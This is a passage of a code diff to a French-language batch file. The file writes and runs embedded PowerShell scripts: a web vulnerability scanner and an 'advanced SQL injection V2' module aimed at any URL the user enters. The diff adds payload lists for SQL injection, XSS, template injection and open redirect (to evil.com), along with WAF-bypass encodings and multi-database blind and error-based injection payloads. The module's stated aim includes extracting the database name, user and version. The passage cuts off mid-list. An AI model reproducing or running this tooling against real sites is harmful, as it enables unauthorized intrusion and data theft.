+echo            if (-not $h.ContainsKey($k)) { Print-Result $checkH[$k] "Header manquant : $k" }
+echo        }
+echo        if ($h.ContainsKey('Server'))      { Print-Result 'LOW' ("Header Server expose : " + $h['Server']) }
+echo        if ($h.ContainsKey('X-Powered-By')){ Print-Result 'LOW' ("Techno exposee : " + $h['X-Powered-By']) }
+echo        if ($h.ContainsKey('X-AspNet-Version')){ Print-Result 'LOW' ("ASP.NET version exposee : " + $h['X-AspNet-Version']) }
+echo        # Clickjacking check
+echo        if ($h.ContainsKey('X-Frame-Options')) {
+echo            $xfo = $h['X-Frame-Options']
+echo            if ($xfo -match 'ALLOW-FROM') { Print-Result 'LOW' "X-Frame-Options ALLOW-FROM est obsolete (utiliser CSP frame-ancestors)" }
+echo            else { Write-Host "  [OK] X-Frame-Options : $xfo" -f Green }
+echo        }
+echo        $cookies = $resp.Headers['Set-Cookie']
+echo        if ($cookies) {
+echo            foreach ($c in $cookies) {
+echo                if ($c -notmatch 'HttpOnly') { Print-Result 'MEDIUM' "Cookie sans flag HttpOnly" }
+echo                if ($c -notmatch 'Secure')   { Print-Result 'MEDIUM' "Cookie sans flag Secure" }
+echo                if ($c -notmatch 'SameSite') { Print-Result 'LOW'    "Cookie sans flag SameSite" }
+echo            }
+echo        }
+echo    } catch { Write-Host "  [!] Impossible d'analyser les headers." -f Gray }
+echo.
+echo    # --- [2/7] SSL/TLS ---
+echo    Write-Host "`n--- [2/7] SSL/TLS et Methodes ---" -f Blue
+echo    if ($url -like 'https*') {
+echo        try {
+echo            $req = [Net.HttpWebRequest]::Create($url)
+echo            $req.Timeout = 5000
+echo            $res = $req.GetResponse()
+echo            $res.Close()
+echo            Write-Host "  [OK] Certificat SSL valide." -f Green
+echo        } catch { Print-Result 'HIGH' "Probleme de certificat SSL ou protocole faible" }
+echo    } else {
+echo        Print-Result 'MEDIUM' "Site servi en HTTP (pas de HTTPS)"
+echo    }
+echo    try {
+echo        $opt = Invoke-WebRequest $url -Method OPTIONS -UserAgent $ua -TimeoutSec 5 -EA SilentlyContinue -UseBasicParsing
+echo        if ($opt.Headers['Allow']) {
+echo            $methods = $opt.Headers['Allow']
+echo            Write-Host "  [INFO] Methodes autorisees : $methods" -f Cyan
+echo            if ($methods -match 'TRACE|CONNECT') { Print-Result 'MEDIUM' "Methode dangereuse activee : $methods (TRACE/CONNECT)" }
+echo            if ($methods -match 'DELETE|PUT') { Print-Result 'LOW' "Methode sensible activee : $methods" }
+echo        }
+echo    } catch {}
+echo.
+echo    # --- [3/7] SQL Injection ---
+echo    Write-Host "`n--- [3/7] SQL Injection ---" -f Blue
+echo    $baseParams = @('id','cat','page','query','search','user','name','type','item','product','order','sort','ref')
+echo    $sqlPayloads = @(
+echo        [char]39,
+echo        [char]34,
+echo        ([char]39 + ' OR 1=1--'),
+echo        ('admin' + [char]39 + '--'),
+echo        ' order by 10--',
+echo        '1 AND 1=2--',
+echo        '1 UNION SELECT NULL--',
+echo        [char]39 + ' AND SLEEP(0)--',
+echo        '1; SELECT 1--',
+echo        ([char]39 + ' OR ' + [char]39 + 'x' + [char]39 + '=' + [char]39 + 'x')
+echo    )
+echo    $sqlErrors = @('sql syntax','mysql','sqlite','syntax error','PostgreSQL',
+echo        'Microsoft OLE DB','Oracle Error','MariaDB','System.Data.SqlClient',
+echo        'You have an error','supplied argument','ODBC','Warning.*mysqli',
+echo        'Incorrect syntax','Unclosed quotation','quoted string not properly',
+echo        'error in your SQL','mysql_fetch','pg_query','SQLiteException',
+echo        'java.sql.SQLException','SQLSTATE','DB Error')
+echo    $uri = [uri]$url
+echo    $q = $uri.Query.TrimStart('?')
+echo    $existingParams = $q.Split('^&', [System.StringSplitOptions]::RemoveEmptyEntries)
+echo    $targets = if ($existingParams.Count -gt 0) { $existingParams ^| ForEach-Object { $_.Split('=')[0] } } else { $baseParams }
+echo.
+echo    # Test aussi les headers comme vecteur SQLi
+echo    $sqlHeaders = @('User-Agent','X-Forwarded-For','X-Forwarded-Host','X-Real-IP','Referer','Accept-Language')
+echo    Write-Host "  [i] Test params GET + headers HTTP..." -f DarkGray
+echo.
+echo    foreach ($ta in $targets) {
+echo        foreach ($p in $sqlPayloads) {
+echo            if ($Host.UI.RawUI.KeyAvailable) {
+echo                $k = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
+echo                if ($k.VirtualKeyCode -eq 27) { Write-Host "`n  [!] Annule." -f Red; exit }
+echo            }
+echo            $encodedP = [uri]::EscapeDataString($p)
+echo            $testUrl = if ($url -like "*$ta=*") {
+echo                $url -replace "$ta=[^^^&]*", "$ta=$encodedP"
+echo            } else {
+echo                if ($url.Contains('?')) { "$url^&$ta=$encodedP" } else { "$url?$ta=$encodedP" }
+echo            }
+echo            try {
+echo                $tr = Invoke-WebRequest $testUrl -UserAgent $ua -TimeoutSec 8 -EA Stop -UseBasicParsing
+echo                if ($tr.StatusCode -in 403,406,429) { Write-Host "  [INFO] WAF/Rate-limit detecte ($($tr.StatusCode)) sur $ta" -f Cyan; break }
+echo                if ($tr.Content -and ($sqlErrors ^| Where-Object { $tr.Content -match $_ })) {
+echo                    Print-Result 'CRITICAL' "SQLi detectee (param:$ta) avec payload: $p"
+echo                }
+echo            } catch {
+echo                if ($_.Exception.Response.StatusCode -in 403,406) { Write-Host "  [INFO] WAF detecte" -f Cyan; break }
+echo            }
+echo        }
+echo        # Time-based SQLi
+echo        $start = Get-Date
+echo        try { $null = Invoke-WebRequest ($url.Split('?')[0] + "?$ta=" + [uri]::EscapeDataString("1' AND SLEEP(5)--")) -TimeoutSec 10 -EA SilentlyContinue -UseBasicParsing } catch {}
+echo        if (((Get-Date) - $start).TotalSeconds -gt 4) { Print-Result 'CRITICAL' "SQLi Time-based detectee sur param [$ta]" }
+echo    }
+echo    # SQLi via headers HTTP
+echo    $sqliPayload = [char]39 + ' OR ' + [char]39 + '1' + [char]39 + '=' + [char]39 + '1'
+echo    foreach ($hdr in $sqlHeaders) {
+echo        try {
+echo            $hdrTest = @{$hdr = $sqliPayload}
+echo            $rH = Invoke-WebRequest $url -Headers $hdrTest -UserAgent $ua -TimeoutSec 6 -EA SilentlyContinue -UseBasicParsing
+echo            if ($rH -and ($sqlErrors ^| Where-Object { $rH.Content -match $_ })) {
+echo                Print-Result 'CRITICAL' "SQLi via header HTTP detectee : $hdr"
+echo            }
+echo        } catch {}
+echo    }
+echo.
+echo    # --- [4/7] XSS Reflecte ---
+echo    Write-Host "`n--- [4/7] XSS Reflecte ---" -f Blue
+echo    $xssPayloads = @(
+echo        ([char]60+'script'+[char]62+'alert(1)'+[char]60+'/script'+[char]62),
+echo        ([char]34+'>'+'<img src=x onerror=alert(1)>'),
+echo        ([char]39+'><svg/onload=alert(1)>'),
+echo        'javascript:alert(1)',
+echo        ('<body onload=alert(1)>'),
+echo        ('<img src=x onerror=alert(1)>'),
+echo        ('"><script>alert(document.domain)</script>'),
+echo        (([char]39)+'><iframe src=javascript:alert(1)>'),
+echo        ('{{7*7}}'),
+echo        ('${7*7}'),
+echo        ('<details open ontoggle=alert(1)>')
+echo    )
+echo    foreach ($ta in $targets) {
+echo        foreach ($xp in $xssPayloads) {
+echo            if ($Host.UI.RawUI.KeyAvailable) {
+echo                $k = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
+echo                if ($k.VirtualKeyCode -eq 27) { Write-Host "`n  [!] Annule." -f Red; exit }
+echo            }
+echo            $encXss = [uri]::EscapeDataString($xp)
+echo            $testUrlXSS = if ($url -like "*$ta=*") {
+echo                $url -replace "$ta=[^^^&]*", "$ta=$encXss"
+echo            } else {
+echo                if ($url.Contains('?')) { "$url^&$ta=$encXss" } else { "$url?$ta=$encXss" }
+echo            }
+echo            try {
+echo                $trX = Invoke-WebRequest $testUrlXSS -UserAgent $ua -TimeoutSec 8 -EA SilentlyContinue -UseBasicParsing
+echo                if ($trX.Content -match [regex]::Escape($xp)) {
+echo                    Print-Result 'HIGH' "XSS Reflecte detecte (param:$ta) payload: $xp"
+echo                }
+echo                # XSS dans les headers de reponse
+echo                if ($trX.Headers['Location'] -match [regex]::Escape($xp)) {
+echo                    Print-Result 'HIGH' "XSS via redirection (param:$ta)"
+echo                }
+echo            } catch {}
+echo        }
+echo    }
+echo.
+echo    # --- [5/7] SSTI (Template Injection) ---
+echo    Write-Host "`n--- [5/7] SSTI (Template Injection) ---" -f Blue
+echo    $sstiPayloads = @('{{7*7}}','${7*7}','<%= 7*7 %>','#{7*7}','*{7*7}','@(7*7)','__${7*7}__')
+echo    $sstiFound = $false
+echo    foreach ($ta in $targets) {
+echo        foreach ($sp in $sstiPayloads) {
+echo            $encS = [uri]::EscapeDataString($sp)
+echo            $testS = if ($url -like "*$ta=*") { $url -replace "$ta=[^^^&]*", "$ta=$encS" } else { if ($url.Contains('?')) { "$url^&$ta=$encS" } else { "$url?$ta=$encS" } }
+echo            try {
+echo                $rs = Invoke-WebRequest $testS -UserAgent $ua -TimeoutSec 6 -EA SilentlyContinue -UseBasicParsing
+echo                if ($rs.Content -match '49' -and -not ($rs.Content -match '497|498|499|490|491|492|493|494|495|496|7*7')) {
+echo                    Print-Result 'CRITICAL' "SSTI possible (param:$ta payload:$sp) - resultat 49 detecte"
+echo                    $sstiFound = $true
+echo                }
+echo            } catch {}
+echo        }
+echo    }
+echo    if (-not $sstiFound) { Write-Host "  [OK] Aucun SSTI detecte." -f Green }
+echo.
+echo    # --- [6/7] CORS et Open Redirect ---
+echo    Write-Host "`n--- [6/7] CORS et Open Redirect ---" -f Blue
+echo    try {
+echo        $cors = Invoke-WebRequest $url -Headers @{Origin='https://evil.com'} -UserAgent $ua -TimeoutSec 5 -EA SilentlyContinue -UseBasicParsing
+echo        $acao = $cors.Headers['Access-Control-Allow-Origin']
+echo        $acac = $cors.Headers['Access-Control-Allow-Credentials']
+echo        if ($acao -eq '*') { Print-Result 'MEDIUM' "CORS permissif (*) detecte" }
+echo        elseif ($acao -match 'evil\.com') { Print-Result 'HIGH' "CORS reflecte l'origine malveillante !" }
+echo        if ($acao -ne $null -and $acac -eq 'true') { Print-Result 'HIGH' "CORS avec credentials=true (vol de session possible !)" }
+echo        if ($acao -eq $null) { Write-Host "  [OK] Pas de header CORS present." -f Green }
+echo    } catch {}
+echo    $redParams = @('redirect','url','next','dest','return','goto','target','forward','redir','r','to','link','out')
+echo    foreach ($ta in $redParams) {
+echo        $testRed = if ($url.Contains('?')) { "$url^&$ta=https://evil.com" } else { "$url?$ta=https://evil.com" }
+echo        try {
+echo            $trR = Invoke-WebRequest $testRed -UserAgent $ua -MaximumRedirection 0 -EA SilentlyContinue -UseBasicParsing
+echo            if ($trR.Headers['Location'] -match 'evil\.com') { Print-Result 'MEDIUM' "Open Redirect potentiel (param:$ta)" }
+echo        } catch {
+echo            if ($_.Exception.Response.Headers['Location'] -match 'evil\.com') { Print-Result 'MEDIUM' "Open Redirect potentiel (param:$ta)" }
+echo        }
+echo    }
+echo.
+echo    # --- [7/7] Rate Limiting et Prototype Pollution ---
+echo    Write-Host "`n--- [7/7] Rate Limiting, Misc ---" -f Blue
+echo    # Test rate limiting (5 requetes rapides)
+echo    $rl_blocked = $false
+echo    for ($i = 0; $i -lt 5; $i++) {
+echo        try {
+echo            $rlr = Invoke-WebRequest $url -UserAgent $ua -TimeoutSec 3 -EA Stop -UseBasicParsing
+echo            if ($rlr.StatusCode -eq 429) { Write-Host "  [OK] Rate limiting actif (HTTP 429)" -f Green; $rl_blocked = $true; break }
+echo        } catch { if ($_.Exception.Response.StatusCode.value__ -eq 429) { Write-Host "  [OK] Rate limiting actif" -f Green; $rl_blocked = $true; break } }
+echo    }
+echo    if (-not $rl_blocked) { Print-Result 'LOW' "Aucun rate limiting detecte (5 requetes sans blocage)" }
+echo    # Prototype pollution
+echo    $ppTest = $url + (if ($url.Contains('?')) { '&' } else { '?' }) + '__proto__[x]=polluted'
+echo    try {
+echo        $pp = Invoke-WebRequest $ppTest -UserAgent $ua -TimeoutSec 5 -EA SilentlyContinue -UseBasicParsing
+echo        if ($pp.StatusCode -eq 200 -and $pp.Content -match 'polluted') {
+echo            Print-Result 'HIGH' "Prototype Pollution possible via URL params"
+echo        }
+echo    } catch {}
+echo    # security.txt
+echo    try {
+echo        $stxt = Invoke-WebRequest ($url.Split('?')[0].TrimEnd('/') + '/.well-known/security.txt') -TimeoutSec 4 -EA SilentlyContinue -UseBasicParsing
+echo        if ($stxt.StatusCode -eq 200) { Write-Host "  [OK] security.txt present (bonne pratique)" -f Green }
+echo        else { Write-Host "  [INFO] Pas de security.txt" -f DarkGray }
+echo    } catch { Write-Host "  [INFO] Pas de security.txt" -f DarkGray }
+echo.
+echo    # --- SCORE FINAL ---
+echo    if ($script:score -lt 0) { $script:score = 0 }
+echo    $grade = if($script:score -ge 90){'A (Excellent)'}elseif($script:score -ge 75){'B (Bon)'}elseif($script:score -ge 50){'C (Moyen)'}elseif($script:score -ge 25){'D (Mauvais)'}else{'F (Critique)'}
+echo    $gc    = if($script:score -ge 75){'Green'}elseif($script:score -ge 50){'Yellow'}else{'Red'}
+echo    Write-Host ""
+echo    Write-Host "  ================================================" -f Cyan
+echo    Write-Host "  Score de securite : $script:score/100  Grade : $grade" -f $gc
+echo    Write-Host "  Findings : $($script:findings.Count) vulnerabilite(s)" -f White
+echo    Write-Host "  ================================================" -f Cyan
+echo    Write-Host "`n  [OK] Scan termine !" -f Green
+echo.
+echo } catch { Write-Host ("`n  [ERREUR FATALE] " + $_.Exception.Message) -f Red }
+) > "%WPS%"
 
 powershell -NoProfile -ExecutionPolicy Bypass -File "%WPS%"
-if exist "%WPS%" del "%WPS%"
+if exist "%WPS%" del /f /q "%WPS%"
 echo.
 pause
 goto net_cyber_menu
+
 
 :cyber_privesc_audit
 cls
@@ -1935,7 +2168,11 @@ goto net_cyber_menu
 cls
 echo.
 echo  ===========================================================
-echo   INJECTION SQL AVANCEE - BLIND BOOLEAN + OOB
+echo   INJECTION SQL AVANCEE V2 - BLIND + WAF BYPASS + EXTRACTION
+echo  ===========================================================
+echo   Nouveau : Test via headers HTTP, WAF bypass encodings,
+echo   extraction DB name/user/version, stacked queries,
+echo   MSSQL/MySQL/PostgreSQL/SQLite/Oracle.
 echo  ===========================================================
 echo.
 set /p "TARGET_URL=URL cible avec parametre (ex: https://site.com/page?id=1) : "
@@ -1944,125 +2181,308 @@ if "%TARGET_URL%"=="" goto net_cyber_menu
 set "SBS=%TEMP%\sqli_blind.ps1"
 if exist "%SBS%" del "%SBS%"
 
-echo $url = "!TARGET_URL!" >> "%SBS%"
-echo if ($url -notmatch '^^http') { $url = 'http://' + $url } >> "%SBS%"
-echo $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" >> "%SBS%"
-echo $totalTests = 0; $vulns = 0 >> "%SBS%"
-echo. >> "%SBS%"
-echo # Extraire les parametres >> "%SBS%"
-echo $uri = [uri]$url >> "%SBS%"
-echo $q = $uri.Query.TrimStart('?') >> "%SBS%"
-echo $params = $q.Split('^&', [System.StringSplitOptions]::RemoveEmptyEntries) >> "%SBS%"
-echo if ($params.Count -eq 0) { Write-Host "  [!] Aucun parametre GET detecte dans l'URL." -f Red; exit } >> "%SBS%"
-echo Write-Host "  [i] Parametres detectes : $($params -join ', ')" -f Cyan >> "%SBS%"
-echo Write-Host "" >> "%SBS%"
-echo. >> "%SBS%"
-echo function Inject-Param { >> "%SBS%"
-echo    param($baseUrl, $param, $payload) >> "%SBS%"
-echo    $key = $param.Split('=')[0] >> "%SBS%"
-echo    $encoded = [uri]::EscapeDataString($payload) >> "%SBS%"
-echo    return $baseUrl -replace "$key=[^^&]*", "$key=$encoded" >> "%SBS%"
-echo } >> "%SBS%"
-echo. >> "%SBS%"
-echo function Get-Response { >> "%SBS%"
-echo    param($testUrl) >> "%SBS%"
-echo    try { >> "%SBS%"
-echo        $r = Invoke-WebRequest $testUrl -UserAgent $ua -TimeoutSec 10 -ErrorAction Stop -UseBasicParsing >> "%SBS%"
-echo        return @{ Code=$r.StatusCode; Length=$r.RawContentLength; Content=$r.Content } >> "%SBS%"
-echo    } catch { return @{ Code=0; Length=0; Content="" } } >> "%SBS%"
-echo } >> "%SBS%"
-echo. >> "%SBS%"
-echo foreach ($param in $params) { >> "%SBS%"
-echo    $key = $param.Split('=')[0] >> "%SBS%"
-echo    Write-Host "  --- Test sur parametre : [$key] ---" -f Blue >> "%SBS%"
-echo. >> "%SBS%"
-echo    # Baseline : reponse normale >> "%SBS%"
-echo    $base = Get-Response $url >> "%SBS%"
-echo    $baseLen = $base.Length >> "%SBS%"
-echo    Write-Host "  Baseline : $baseLen bytes (HTTP $($base.Code))" -f Gray >> "%SBS%"
-echo. >> "%SBS%"
-echo    # === TEST 1 : Boolean-based blind === >> "%SBS%"
-echo    Write-Host "  [1/4] Boolean-based blind SQLi..." -f Yellow >> "%SBS%"
-echo    $truePayloads  = @("1 AND 1=1--", "1' AND '1'='1'--", "1 AND 1=1#") >> "%SBS%"
-echo    $falsePayloads = @("1 AND 1=2--", "1' AND '1'='2'--", "1 AND 1=2#") >> "%SBS%"
-echo    for ($i = 0; $i -lt $truePayloads.Count; $i++) { >> "%SBS%"
-echo        $trueUrl  = Inject-Param $url $param $truePayloads[$i] >> "%SBS%"
-echo        $falseUrl = Inject-Param $url $param $falsePayloads[$i] >> "%SBS%"
-echo        $trueR  = Get-Response $trueUrl >> "%SBS%"
-echo        $falseR = Get-Response $falseUrl >> "%SBS%"
-echo        $diff = [math]::Abs($trueR.Length - $falseR.Length) >> "%SBS%"
-echo        if ($trueR.Length -eq $baseLen -and $diff -gt 50) { >> "%SBS%"
-echo            Write-Host "  [VULN] Boolean-based detectee ! TRUE=$($trueR.Length)b FALSE=$($falseR.Length)b (diff=$diff)" -f Red >> "%SBS%"
-echo            Write-Host "         Payload TRUE  : $($truePayloads[$i])" -f Magenta >> "%SBS%"
-echo            Write-Host "         Payload FALSE : $($falsePayloads[$i])" -f Magenta >> "%SBS%"
-echo            $vulns++ >> "%SBS%"
-echo        } >> "%SBS%"
-echo    } >> "%SBS%"
-echo. >> "%SBS%"
-echo    # === TEST 2 : Time-based blind (multi-DB) === >> "%SBS%"
-echo    Write-Host "  [2/4] Time-based blind (MySQL/MSSQL/PostgreSQL/SQLite)..." -f Yellow >> "%SBS%"
-echo    $timePayloads = @( >> "%SBS%"
-echo        "1' AND SLEEP(5)--",        # MySQL >> "%SBS%"
-echo        "1; WAITFOR DELAY '0:0:5'--", # MSSQL >> "%SBS%"
-echo        "1' AND pg_sleep(5)--",      # PostgreSQL >> "%SBS%"
-echo        "1 AND 1=1 AND SLEEP(5)--",  # MySQL alt >> "%SBS%"
-echo        "1'; SELECT pg_sleep(5)--"   # PostgreSQL alt >> "%SBS%"
-echo    ) >> "%SBS%"
-echo    foreach ($tp in $timePayloads) { >> "%SBS%"
-echo        $tUrl = Inject-Param $url $param $tp >> "%SBS%"
-echo        $start = Get-Date >> "%SBS%"
-echo        $null = Get-Response $tUrl >> "%SBS%"
-echo        $elapsed = ((Get-Date) - $start).TotalSeconds >> "%SBS%"
-echo        if ($elapsed -gt 4.5) { >> "%SBS%"
-echo            Write-Host "  [VULN] Time-based detectee ! Delai : $([math]::Round($elapsed,1))s" -f Red >> "%SBS%"
-echo            Write-Host "         Payload : $tp" -f Magenta >> "%SBS%"
-echo            $vulns++ >> "%SBS%"
-echo        } >> "%SBS%"
-echo    } >> "%SBS%"
-echo. >> "%SBS%"
-echo    # === TEST 3 : Error-based (multi-DB) === >> "%SBS%"
-echo    Write-Host "  [3/4] Error-based (MySQL/MSSQL/Oracle/PostgreSQL)..." -f Yellow >> "%SBS%"
-echo    $errPayloads = @( >> "%SBS%"
-echo        [char]39, [char]34, "1')", "1'--", "1'#", >> "%SBS%"
-echo        "1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",  # MySQL >> "%SBS%"
-echo        "1; SELECT 1/0--",                                  # Division par zero >> "%SBS%"
-echo        "1' AND 1=CONVERT(int,'a')--",                     # MSSQL >> "%SBS%"
-echo        "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL--" >> "%SBS%"
-echo    ) >> "%SBS%"
-echo    $errKeywords = @('sql','mysql','sqlite','syntax error','ORA-','PostgreSQL','Microsoft OLE','ODBC','JDBC','Warning.*\Wmysqli?_','You have an error','supplied argument') >> "%SBS%"
-echo    foreach ($ep in $errPayloads) { >> "%SBS%"
-echo        $eUrl = Inject-Param $url $param $ep >> "%SBS%"
-echo        $eR = Get-Response $eUrl >> "%SBS%"
-echo        $hit = $errKeywords ^| Where-Object { $eR.Content -match $_ } >> "%SBS%"
-echo        if ($hit) { >> "%SBS%"
-echo            Write-Host "  [VULN] Error-based detectee ! Mot-cle : $($hit[0])" -f Red >> "%SBS%"
-echo            Write-Host "         Payload : $ep" -f Magenta >> "%SBS%"
-echo            $vulns++ >> "%SBS%"
-echo        } >> "%SBS%"
-echo    } >> "%SBS%"
-echo. >> "%SBS%"
-echo    # === TEST 4 : UNION-based (detection colonnes) === >> "%SBS%"
-echo    Write-Host "  [4/4] UNION-based (detection nombre de colonnes)..." -f Yellow >> "%SBS%"
-echo    for ($cols = 1; $cols -le 10; $cols++) { >> "%SBS%"
-echo        $nulls = ('NULL,' * $cols).TrimEnd(',') >> "%SBS%"
-echo        $uPayload = "1 UNION SELECT $nulls--" >> "%SBS%"
-echo        $uUrl = Inject-Param $url $param $uPayload >> "%SBS%"
-echo        $uR = Get-Response $uUrl >> "%SBS%"
-echo        if ($uR.Code -eq 200 -and $uR.Length -ne $baseLen) { >> "%SBS%"
-echo            Write-Host "  [VULN] UNION fonctionne avec $cols colonne(s) !" -f Red >> "%SBS%"
-echo            Write-Host "         Payload : $uPayload" -f Magenta >> "%SBS%"
-echo            $vulns++ >> "%SBS%"
-echo            break >> "%SBS%"
-echo        } >> "%SBS%"
-echo    } >> "%SBS%"
-echo. >> "%SBS%"
-echo } >> "%SBS%"
-echo Write-Host "" >> "%SBS%"
-echo if ($vulns -gt 0) { >> "%SBS%"
-echo    Write-Host "  [!!!] $vulns vulnerabilite(s) SQLi detectee(s) !" -f Red >> "%SBS%"
-echo } else { >> "%SBS%"
-echo    Write-Host "  [OK] Aucune SQLi detectee sur les parametres testes." -f Green >> "%SBS%"
-echo } >> "%SBS%"
+(
+echo $url = "!TARGET_URL!"
+echo if ($url -notmatch '^^http') { $url = 'http://' + $url }
+echo $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+echo $vulns = 0
+echo $waf_detected = $false
+echo.
+echo # Extraire les parametres
+echo $uri = [uri]$url
+echo $q = $uri.Query.TrimStart('?')
+echo $params = $q.Split('^&', [System.StringSplitOptions]::RemoveEmptyEntries)
+echo if ($params.Count -eq 0) { Write-Host "  [!] Aucun parametre GET detecte dans l'URL." -f Red; exit }
+echo Write-Host "  [i] Parametres detectes : $($params -join ', ')" -f Cyan
+echo Write-Host ""
+echo.
+echo function Inject-Param {
+echo    param($baseUrl, $param, $payload)
+echo    $key = $param.Split('=')[0]
+echo    $encoded = [uri]::EscapeDataString($payload)
+echo    return $baseUrl -replace "$key=[^^&]*", "$key=$encoded"
+echo }
+echo.
+echo function Get-Response {
+echo    param($testUrl, $headers = @{})
+echo    try {
+echo        if ($headers.Count -gt 0) {
+echo            $r = Invoke-WebRequest $testUrl -UserAgent $ua -Headers $headers -TimeoutSec 10 -ErrorAction Stop -UseBasicParsing
+echo        } else {
+echo            $r = Invoke-WebRequest $testUrl -UserAgent $ua -TimeoutSec 10 -ErrorAction Stop -UseBasicParsing
+echo        }
+echo        return @{ Code=$r.StatusCode; Length=$r.RawContentLength; Content=$r.Content }
+echo    } catch { return @{ Code=0; Length=0; Content="" } }
+echo }
+echo.
+echo # WAF Detection initiale
+echo Write-Host "  [PRE] Detection WAF/IDS..." -f DarkGray
+echo $wafPayload = [char]39 + ' OR 1=1--'
+echo $wafUrl = Inject-Param $url $params[0] $wafPayload
+echo $wafR = Get-Response $wafUrl
+echo if ($wafR.Code -in 403,406,419,429,503) {
+echo    Write-Host "  [!] WAF/IPS detecte (HTTP $($wafR.Code)) - Utilisation des bypass encodings" -f Yellow
+echo    $script:waf_detected = $true
+echo } elseif ($wafR.Content -match 'blocked|forbidden|not allowed|firewall|security|waf') {
+echo    Write-Host "  [!] WAF detecte via message HTML" -f Yellow
+echo    $script:waf_detected = $true
+echo } else {
+echo    Write-Host "  [OK] Pas de WAF detecte en surface" -f Green
+echo }
+echo.
+echo # Payloads WAF bypass si WAF detecte
+echo $bypassEncodings = if ($script:waf_detected) {
+echo    @(
+echo        { param($p) $p },                                          # Normal
+echo        { param($p) $p.Replace(' ', '/**/') },                     # Comment bypass
+echo        { param($p) $p.Replace(' ', '%20') },                      # URL encoded space
+echo        { param($p) $p.Replace(' ', '+') },                        # Plus space
+echo        { param($p) $p.Replace("'", "%27") },                      # URL encoded quote
+echo        { param($p) [uri]::EscapeDataString([uri]::EscapeDataString($p)) } # Double URL encode
+echo    )
+echo } else {
+echo    @({ param($p) $p })
+echo }
+echo.
+echo foreach ($param in $params) {
+echo    $key = $param.Split('=')[0]
+echo    Write-Host "  =============================" -f Cyan
+echo    Write-Host "  Parametre : [$key]" -f Cyan
+echo    Write-Host "  =============================" -f Cyan
+echo.
+echo    $base = Get-Response $url
+echo    $baseLen = $base.Length
+echo    Write-Host "  Baseline : $baseLen bytes (HTTP $($base.Code))" -f Gray
+echo.
+echo    # TEST 1 : Boolean-based blind avec WAF bypass
+echo    Write-Host "  [1/6] Boolean-based blind SQLi..." -f Yellow
+echo    $truePayloads  = @(
+echo        "1 AND 1=1--",
+echo        "1' AND '1'='1'--",
+echo        "1 AND 1=1#",
+echo        "1 AND 1=1/*",
+echo        "1' AND '1'='1' AND '1'='1",
+echo        "1 OR 1=1--",
+echo        "1) AND (1=1--",
+echo        "1')) AND ((1=1--"
+echo    )
+echo    $falsePayloads = @(
+echo        "1 AND 1=2--",
+echo        "1' AND '1'='2'--",
+echo        "1 AND 1=2#",
+echo        "1 AND 1=2/*",
+echo        "1' AND '1'='2' AND '1'='2",
+echo        "1 OR 1=2--",
+echo        "1) AND (1=2--",
+echo        "1')) AND ((1=2--"
+echo    )
+echo    for ($i = 0; $i -lt $truePayloads.Count; $i++) {
+echo        foreach ($enc in $bypassEncodings) {
+echo            $tPayload = & $enc $truePayloads[$i]
+echo            $fPayload = & $enc $falsePayloads[$i]
+echo            $trueUrl  = Inject-Param $url $param $tPayload
+echo            $falseUrl = Inject-Param $url $param $fPayload
+echo            $trueR  = Get-Response $trueUrl
+echo            $falseR = Get-Response $falseUrl
+echo            $diff = [math]::Abs($trueR.Length - $falseR.Length)
+echo            if ($trueR.Length -eq $baseLen -and $diff -gt 50) {
+echo                Write-Host "  [VULN] Boolean-based detectee ! TRUE=$($trueR.Length)b FALSE=$($falseR.Length)b (diff=$diff)" -f Red
+echo                Write-Host "         Payload TRUE  : $($truePayloads[$i])" -f Magenta
+echo                $vulns++; break
+echo            }
+echo        }
+echo    }
+echo.
+echo    # TEST 2 : Time-based blind (multi-DB + WAF bypass)
+echo    Write-Host "  [2/6] Time-based blind (MySQL/MSSQL/PostgreSQL/SQLite/Oracle)..." -f Yellow
+echo    $timePayloads = @(
+echo        @{P="1' AND SLEEP(4)--";       DB="MySQL"},
+echo        @{P="1 AND SLEEP(4)--";        DB="MySQL (no quote)"},
+echo        @{P="1; WAITFOR DELAY '0:0:4'--"; DB="MSSQL"},
+echo        @{P="1'; WAITFOR DELAY '0:0:4'--"; DB="MSSQL (quote)"},
+echo        @{P="1' AND pg_sleep(4)--";    DB="PostgreSQL"},
+echo        @{P="1 AND pg_sleep(4)--";     DB="PostgreSQL (no quote)"},
+echo        @{P="1' AND 1=(SELECT 1 FROM (SELECT SLEEP(4))x)--"; DB="MySQL subquery"},
+echo        @{P="1 OR SLEEP(4)--";         DB="MySQL OR"},
+echo        @{P="1' OR SLEEP(4)--";        DB="MySQL OR (quote)"},
+echo        @{P="1 AND 1=1 AND SLEEP(4)--"; DB="MySQL chain"},
+echo        @{P="1'; SELECT SLEEP(4)--";   DB="MySQL stacked"},
+echo        @{P="1'; SELECT pg_sleep(4)--"; DB="PostgreSQL stacked"},
+echo        @{P="1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',4)--"; DB="Oracle"}
+echo    )
+echo    foreach ($tp in $timePayloads) {
+echo        foreach ($enc in $bypassEncodings) {
+echo            $tPayload = & $enc $tp.P
+echo            $tUrl = Inject-Param $url $param $tPayload
+echo            $start = Get-Date
+echo            $null = Get-Response $tUrl
+echo            $elapsed = ((Get-Date) - $start).TotalSeconds
+echo            if ($elapsed -gt 3.5) {
+echo                Write-Host "  [VULN] Time-based detectee ! DB:$($tp.DB) Delai:$([math]::Round($elapsed,1))s" -f Red
+echo                Write-Host "         Payload : $($tp.P)" -f Magenta
+echo                $vulns++; break
+echo            }
+echo        }
+echo        if ($Host.UI.RawUI.KeyAvailable -and $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { Write-Host "`n  [!] Annule." -f Red; exit }
+echo    }
+echo.
+echo    # TEST 3 : Error-based (multi-DB)
+echo    Write-Host "  [3/6] Error-based (MySQL/MSSQL/Oracle/PostgreSQL)..." -f Yellow
+echo    $errPayloads = @(
+echo        [char]39, [char]34, "1')", "1'--", "1'#", "1''",
+echo        "1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+echo        "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+echo        "1; SELECT 1/0--",
